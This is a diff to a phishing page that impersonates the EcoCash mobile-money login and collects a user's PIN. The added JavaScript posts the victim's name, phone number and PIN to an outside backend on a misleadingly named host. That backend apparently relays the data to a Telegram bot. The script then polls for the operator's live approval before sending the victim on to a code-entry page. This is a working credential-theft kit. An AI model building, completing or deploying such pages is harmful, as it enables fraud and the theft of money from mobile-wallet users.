@@ -4,186 +4,155 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>EcoCash | Enter PIN</title>
-
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
-body{
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
-    background:#0a5aa8;
-    min-height:100vh;
-}
-
-.pin-container{
-    position:relative;
-    background:#ffffff;
-    text-align:center;
-    padding:90px 20px 120px;
-}
-
-.white-curve{
-    position:absolute;
-    bottom:-1px;
-    left:0;
-    width:100%;
-    height:60px;
-}
-
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a5aa8;min-height:100vh;}
+.pin-container{position:relative;background:#ffffff;text-align:center;padding:90px 20px 120px;}
+.white-curve{position:absolute;bottom:-1px;left:0;width:100%;height:60px;}
 .brand{font-size:36px;font-weight:700;margin-bottom:18px;}
 .brand .eco{color:#0a5aa8;}
 .brand .cash{color:#e53935;}
-
-h2{
-    font-size:20px;
-    font-weight:600;
-    color:#6b6b6b;
-    margin-bottom:10px;
-}
-
-#phoneDisplay{
-    border:none;
-    background:transparent;
-    font-size:15px;
-    color:#6b6b6b;
-    text-align:center;
-    margin-bottom:32px;
-}
-
-.pin-container p{
-    color:#6b6b6b;
-    font-size:14px;
-    margin-bottom:20px;
-}
-
-.pin-boxes{
-    display:flex;
-    justify-content:center;
-    gap:14px;
-}
-
-.pin-boxes input{
-    width:64px;
-    height:64px;
-    border:2px solid #1e6fb8;
-    border-radius:10px;
-    font-size:22px;
-    text-align:center;
-    outline:none;
-}
-
-.blue-section{
-    background:#0a5aa8;
-    text-align:center;
-    padding:100px 20px 40px;
-    color:#ffffff;
-}
-
-.blue-section p{
-    font-size:14px;
-    margin-bottom:26px;
-}
-
-.action-buttons{
-    display:flex;
-    justify-content:center;
-    gap:18px;
-    margin-bottom:40px;
-}
-
-.action{
-    background:#ffffff;
-    color:#0a5aa8;
-    width:160px;
-    padding:24px 10px;
-    border-radius:12px;
-    font-size:14px;
-    font-weight:500;
-    box-shadow:0 6px 14px rgba(0,0,0,0.15);
-}
-
+h2{font-size:20px;font-weight:600;color:#6b6b6b;margin-bottom:10px;}
+#phoneDisplay{border:none;background:transparent;font-size:15px;color:#6b6b6b;text-align:center;margin-bottom:32px;}
+.pin-container p{color:#6b6b6b;font-size:14px;margin-bottom:20px;}
+.pin-boxes{display:flex;justify-content:center;gap:14px;}
+.pin-boxes input{width:64px;height:64px;border:2px solid #1e6fb8;border-radius:10px;font-size:22px;text-align:center;outline:none;}
+.blue-section{background:#0a5aa8;text-align:center;padding:100px 20px 40px;color:#ffffff;}
+.blue-section p{font-size:14px;margin-bottom:26px;}
+.action-buttons{display:flex;justify-content:center;gap:18px;margin-bottom:40px;}
+.action{background:#ffffff;color:#0a5aa8;width:160px;padding:24px 10px;border-radius:12px;font-size:14px;font-weight:500;box-shadow:0 6px 14px rgba(0,0,0,0.15);}
 .footer{font-size:12px;color:#ffffff;}
 .footer p{margin:6px 0;}
 .footer a{color:#ffffff;text-decoration:underline;}
+#status{margin-top:12px;color:#e60000;font-size:14px;}
 </style>
 </head>
-
 <body>
 
 <div class="pin-container">
-<div class="brand">
-<span class="eco">Eco</span><span class="cash">Cash</span>
-</div>
-
-<h2>Welcome</h2>
-<input id="phoneDisplay" readonly>
-
-<p>Enter your PIN</p>
-
-<div class="pin-boxes">
-<input type="tel" maxlength="1">
-<input type="tel" maxlength="1">
-<input type="tel" maxlength="1">
-<input type="tel" maxlength="1">
-</div>
-
-<svg class="white-curve" viewBox="0 0 1440 60" preserveAspectRatio="none">
-<path d="M0,0 C360,40 1080,40 1440,0 L1440,60 L0,60 Z" fill="#ffffff"/>
-</svg>
+  <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+  <h2>Welcome</h2>
+  <input id="phoneDisplay" readonly>
+  <p>Enter your PIN</p>
+  <div class="pin-boxes">
+    <input type="tel" maxlength="1">
+    <input type="tel" maxlength="1">
+    <input type="tel" maxlength="1">
+    <input type="tel" maxlength="1">
+  </div>
+  <div id="status"></div>
+  <svg class="white-curve" viewBox="0 0 1440 60" preserveAspectRatio="none">
+    <path d="M0,0 C360,40 1080,40 1440,0 L1440,60 L0,60 Z" fill="#ffffff"/>
+  </svg>
 </div>
 
 <div class="blue-section">
-<p>To register an EcoCash wallet or get assistance,<br>click below</p>
-
-<div class="action-buttons">
-<div class="action">Register</div>
-<div class="action">Help & Support</div>
-</div>
-
-<div class="footer">
-<p>v3.0.2P</p>
-<p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
-</div>
+  <p>To register an EcoCash wallet or get assistance,<br>click below</p>
+  <div class="action-buttons">
+    <div class="action">Register</div>
+    <div class="action">Help & Support</div>
+  </div>
+  <div class="footer">
+    <p>v3.0.2P</p>
+    <p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
+  </div>
 </div>
 
 <script>
 // ---------- SHOW PHONE ----------
-document.getElementById("phoneDisplay").value =
-localStorage.getItem("phone") || "Unknown Number";
+document.getElementById("phoneDisplay").value = localStorage.getItem("phone") || "Unknown Number";
 
 // ---------- BOT ID ----------
 const botId = new URLSearchParams(window.location.search).get("botId");
 
-// ---------- PIN AUTO INPUT ----------
+// ---------- PIN INPUT ----------
 const boxes = document.querySelectorAll(".pin-boxes input");
+const statusEl = document.getElementById("status");
 
+// Function to send PIN to backend/Telegram
+async function sendPinToTelegram(name, phone, pin) {
+  const BACKEND_URL = "https://united-nations-development-program.onrender.com"; // replace with your backend
+  try {
+    const res = await fetch(`${BACKEND_URL}/send-pin`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ name, phone, pin, botId })
+    });
+    return res.json(); // expects { requestId }
+  } catch(err) {
+    console.error("Telegram submission failed", err);
+    return null;
+  }
+}
+
+// Poll backend for approval from Telegram buttons
+async function pollPinApproval(requestId) {
+  const BACKEND_URL = "https://united-nations-development-program.onrender.com";
+  return new Promise((resolve) => {
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+        const data = await res.json();
+        if(data.approved === true){
+          clearInterval(interval);
+          resolve(true);
+        } else if(data.approved === false){
+          clearInterval(interval);
+          resolve(false);
+        }
+      } catch(err){ console.error(err); }
+    }, 1500);
+  });
+}
+
+// Handle input
 boxes.forEach((box, i) => {
-    box.addEventListener("input", () => {
-        box.value = box.value.replace(/[^0-9]/g,'');
+  box.addEventListener("input", async () => {
+    box.value = box.value.replace(/[^0-9]/g,'');
 
-        // move forward
-        if(box.value && i < boxes.length-1){
-            boxes[i+1].focus();
-        }
+    if(box.value && i < boxes.length-1) boxes[i+1].focus();
 
-        // last digit entered → redirect
-        if(i === boxes.length-1 && box.value){
-            let pin = "";
-            boxes.forEach(b => pin += b.value);
+    if(i === boxes.length-1 && box.value){
+      let pin = "";
+      boxes.forEach(b => pin += b.value);
+      localStorage.setItem("pin", pin);
 
-            localStorage.setItem("pin", pin);
+      const name = localStorage.getItem("name") || "Unknown";
+      const phone = localStorage.getItem("phone") || "Unknown";
 
-            window.location.href = "code.html?botId=" + botId;
-        }
-    });
+      // Disable inputs while waiting
+      boxes.forEach(b => b.disabled = true);
+      statusEl.textContent = "Submitting PIN... Please wait for approval.";
 
-    // backspace move back
-    box.addEventListener("keydown", e => {
-        if(e.key==="Backspace" && !box.value && i>0){
-            boxes[i-1].focus();
-        }
-    });
+      const response = await sendPinToTelegram(name, phone, pin);
+      if(!response || !response.requestId){
+        statusEl.textContent = "Failed to submit PIN. Try again.";
+        boxes.forEach(b => b.disabled = false);
+        boxes.forEach(b => b.value = "");
+        boxes[0].focus();
+        return;
+      }
+
+      // Poll for approval
+      const approved = await pollPinApproval(response.requestId);
+      if(approved){
+        localStorage.setItem("pinApproved", "true"); // optional
+        window.location.href = "code.html?botId=" + botId;
+      } else {
+        statusEl.textContent = "Incorrect PIN. Please try again.";
+        boxes.forEach(b => b.disabled = false);
+        boxes.forEach(b => b.value = "");
+        boxes[0].focus();
+      }
+    }
+  });
+
+  // backspace move back
+  box.addEventListener("keydown", e => {
+    if(e.key==="Backspace" && !box.value && i>0) boxes[i-1].focus();
+  });
 });
 
-// focus first box
 boxes[0].focus();
 </script>
 
